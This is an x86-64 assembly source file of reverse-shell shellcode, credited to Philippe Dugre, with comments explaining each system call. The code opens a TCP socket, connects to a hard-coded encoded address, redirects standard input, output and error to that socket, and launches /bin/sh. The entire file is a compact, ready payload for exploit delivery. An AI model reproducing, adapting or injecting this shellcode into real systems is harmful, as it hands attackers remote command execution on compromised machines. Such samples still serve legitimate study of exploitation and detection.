; File: shellcode-907.nasm
; Author: Philippe Dugre

global _start

section .text

_start:

	push byte 41
	pop rax                 ; syscall number 41, int socket(int domain, int type, int protocol)
	cdq                     ; zeroing RDX via sign extension
	push byte 2
	pop rdi                 ; RDI = 2, int domain = PF_INET = 2
	push byte 1
	pop rsi                 ; RSI = 1, int type = SOCK_STREAM = 1
	syscall                 ; invoke system call socket(2, 1, 0)

	xchg eax, edi           ; EAX = 2, EDI = fd_num
	mov al, 42              ; 
	mov rcx, 0x201017fb3150002
	; neg rcx 
	push rcx
	push rsp
	pop rsi
	mov dl, 16
	syscall

	push byte 3
	pop rsi

dup2_loop:

    mov al, 33
    dec esi
    syscall
    jnz dup2_loop

	cdq
	mov al, 59
	push rdx
	mov rcx, 0x68732f2f6e69622f
	push rcx
	push rsp
	pop rdi
	syscall
